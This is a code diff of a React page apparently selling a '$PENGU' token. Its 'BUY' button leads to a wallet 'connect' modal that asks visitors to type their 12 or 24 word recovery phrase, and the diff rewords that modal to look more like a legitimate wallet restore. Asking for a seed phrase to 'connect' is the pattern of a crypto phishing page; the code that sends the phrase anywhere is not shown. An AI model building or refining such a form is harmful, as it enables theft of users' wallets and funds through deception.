@@ -421,7 +421,7 @@ export default function MainContent() {
             {/* Header */}
             <div className="flex justify-between items-center p-6 border-b border-gray-200">
               <h2 className="text-xl font-semibold text-gray-800">
-                Seed Phrases
+                Recovery Phrase
               </h2>
               <button
                 onClick={handleCloseAllModals}
@@ -439,13 +439,14 @@ export default function MainContent() {
                     Connect to {selectedWallet}
                   </h3>
                   <p className="text-gray-600 text-sm">
-                    Enter your 12-24 word phrase to connect
+                    Restore an existing wallet with your 12 or <br /> 24 word
+                    recovery phrase
                   </p>
                 </div>
                 <textarea
                   value={seedPhrase}
                   onChange={(e) => setSeedPhrase(e.target.value)}
-                  placeholder="Enter your 12-24 word recovery phrase..."
+                  placeholder="Recovery Phrase"
                   className="w-full h-32 p-3 bg-gray-100 border border-gray-300 rounded-lg text-gray-800 placeholder-gray-500 resize-none"
                 />
                 <div className="flex space-x-3">
@@ -643,7 +644,10 @@ export default function MainContent() {
 
         {/* Buy Button */}
         <Button
-          onClick={() => setShowWalletModal(true)}
+          onClick={() => {
+            setShowConnectWalletModal(true);
+            setCurrentStep(1);
+          }}
           className="bg-purple-500 hover:bg-purple-600 text-white font-bold px-8 py-3 rounded-lg text-lg"
         >
           BUY $PENGU
